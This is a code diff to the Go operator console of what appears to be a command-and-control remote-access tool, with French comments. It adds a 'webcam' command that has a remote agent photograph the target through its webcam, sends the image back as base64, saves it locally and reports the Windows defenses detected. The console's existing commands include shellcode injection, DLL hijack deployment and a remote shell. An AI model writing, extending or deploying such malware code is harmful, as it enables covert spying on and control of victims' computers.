@@ -13,6 +13,7 @@
 //   inject <pid>        → injecter du shellcode dans un PID
 //   proclist            → liste des processus
 //   screenshot          → capture d'écran
+//   webcam              → capturer un frame webcam (sauvegardé en JPEG local)
 //   sleep <seconds>     → modifier l'intervalle beacon
 //   kill                → terminer l'agent
 //   interactive         → mode shell pseudo-interactif
@@ -32,6 +33,7 @@ import (
 	"io"
 	"net/http"
 	"os"
+	"path/filepath"
 	"strings"
 	"time"
 )
@@ -184,11 +186,17 @@ func (c *Console) handleCommand(cmd string, args []string) error {
 			return fmt.Errorf("usage: hijack_deploy <chemin_local_vers_dll>")
 		}
 		return c.cmdHijackDeploy(args[0])
+	case "webcam":
+		if c.ActiveAgent == "" {
+			return fmt.Errorf("aucun agent sélectionné")
+		}
+		return c.cmdWebcam()
 	case "screenshot":
 		if c.ActiveAgent == "" {
 			return fmt.Errorf("aucun agent sélectionné")
 		}
 		return c.cmdTask("screenshot", "")
+
 	case "sleep":
 		if c.ActiveAgent == "" || len(args) == 0 {
 			return fmt.Errorf("usage: sleep <secondes>")
@@ -345,6 +353,122 @@ func (c *Console) cmdHijackDeploy(dllPath string) error {
 	
 	fmt.Printf("[*] Envoi de la DLL (%d bytes)...", len(data))
 	return c.cmdTask("hijack_deploy", encoded)
+}
+
+// cmdWebcam — demande une capture webcam à l'agent et sauvegarde le JPEG localement
+//
+// Flux :
+//   1. Envoie la tâche "webcam_snap" à l'agent
+//   2. Poll le résultat (timeout 60s — la capture peut prendre du temps)
+//   3. Si succès : décode le base64 JPEG et sauvegarde en fichier local
+//   4. Si échec : affiche les défenses Windows détectées par l'agent
+func (c *Console) cmdWebcam() error {
+	fmt.Println("[*] Envoi de la tâche webcam_snap à l'agent...")
+	fmt.Println("[!] Note : la LED de la webcam s'allumera sur la machine cible")
+
+	taskID, err := c.cmdTaskInternal("webcam_snap", "")
+	if err != nil {
+		return err
+	}
+
+	shortID := taskID
+	if len(shortID) > 8 {
+		shortID = shortID[:8]
+	}
+	fmt.Printf("[+] Tâche webcam_snap créée [%s] — attente résultat (timeout 60s)...\n", shortID)
+
+	// Poll avec timeout étendu (60s) car la capture webcam prend du temps
+	result := c.pollWebcamResult(taskID)
+	if result == "" {
+		return fmt.Errorf("timeout : l'agent n'a pas retourné de résultat dans les 60 secondes")
+	}
+
+	// Parser le résultat
+	if strings.HasPrefix(result, "WEBCAM_SUCCESS") {
+		lines := strings.SplitN(result, "\n", -1)
+		var imageB64 string
+		var deviceName, resolution, defenses string
+
+		for _, line := range lines {
+			if strings.HasPrefix(line, "Device: ") {
+				deviceName = strings.TrimPrefix(line, "Device: ")
+			} else if strings.HasPrefix(line, "Resolution: ") {
+				resolution = strings.TrimPrefix(line, "Resolution: ")
+			} else if strings.HasPrefix(line, "Defenses: ") {
+				defenses = strings.TrimPrefix(line, "Defenses: ")
+			} else if strings.HasPrefix(line, "DATA:") {
+				imageB64 = strings.TrimPrefix(line, "DATA:")
+			}
+		}
+
+		fmt.Printf("[+] Webcam capturée avec succès !\n")
+		fmt.Printf("    Périphérique : %s\n", deviceName)
+		fmt.Printf("    Résolution   : %s\n", resolution)
+		fmt.Printf("    Défenses     : %s\n", defenses)
+
+		// Décoder et sauvegarder le JPEG
+		if imageB64 != "" {
+			jpegData, err := base64.StdEncoding.DecodeString(imageB64)
+			if err != nil {
+				return fmt.Errorf("erreur décodage base64 JPEG : %v", err)
+			}
+
+			// Nom de fichier avec timestamp
+			timestamp := time.Now().Format("20060102_150405")
+			agentShort := c.ActiveAgent
+			if len(agentShort) > 8 {
+				agentShort = agentShort[:8]
+			}
+			filename := filepath.Join(".", fmt.Sprintf("webcam_%s_%s.jpg", agentShort, timestamp))
+
+			if err := os.WriteFile(filename, jpegData, 0644); err != nil {
+				return fmt.Errorf("impossible de sauvegarder le JPEG : %v", err)
+			}
+
+			absPath, _ := filepath.Abs(filename)
+			fmt.Printf("[+] Image sauvegardée → %s (%d bytes)\n", absPath, len(jpegData))
+		}
+	} else if strings.HasPrefix(result, "WEBCAM_FAILED") {
+		fmt.Println("[!] Capture webcam échouée — Rapport de défenses Windows :")
+		lines := strings.Split(result, "\n")
+		for _, line := range lines[1:] {
+			if strings.TrimSpace(line) != "" {
+				fmt.Printf("    %s\n", line)
+			}
+		}
+	} else {
+		fmt.Printf("[?] Réponse inattendue : %s\n", result)
+	}
+
+	return nil
+}
+
+// pollWebcamResult — poll spécialisé avec timeout 60s pour la capture webcam
+func (c *Console) pollWebcamResult(taskID string) string {
+	for i := 0; i < 60; i++ {
+		time.Sleep(1 * time.Second)
+		var result map[string]interface{}
+		if err := c.apiGet("/api/agents/"+c.ActiveAgent+"/tasks", &result); err != nil {
+			continue
+		}
+		tasks, ok := result["tasks"].([]interface{})
+		if !ok {
+			continue
+		}
+		for _, t := range tasks {
+			task := t.(map[string]interface{})
+			id := fmt.Sprintf("%v", task["id"])
+			if id == taskID {
+				status := fmt.Sprintf("%v", task["status"])
+				if status == "success" || status == "done" {
+					return fmt.Sprintf("%v", task["result"])
+				} else if status == "error" {
+					return fmt.Sprintf("%v", task["result"])
+				}
+			}
+		}
+	}
+	return ""
 }
 
 // cmdInteractive — mode shell pseudo-interactif
@@ -592,6 +716,7 @@ func (c *Console) printHelp() {
     netstat             Connexions réseau actives
     download <path>     Télécharger un fichier
     screenshot          Capture d'écran
+    webcam              Capturer un frame webcam → JPEG sauvegardé localement
     sleep <secs>        Modifier l'intervalle beacon
     tasks               Historique des tâches
     interactive         Mode shell pseudo-interactif (sleep 1s)
@@ -603,8 +728,10 @@ func (c *Console) printHelp() {
     - Les IDs peuvent être abrégés (8 premiers caractères)
     - Les tâches sont asynchrones — l'agent les récupère au prochain beacon
     - Utiliser 'tasks' pour voir les résultats
+    - 'webcam' sauvegarde automatiquement le JPEG dans le répertoire courant
 `
 	fmt.Println(help)
+
 }
 
 func truncate(s string, n int) string {
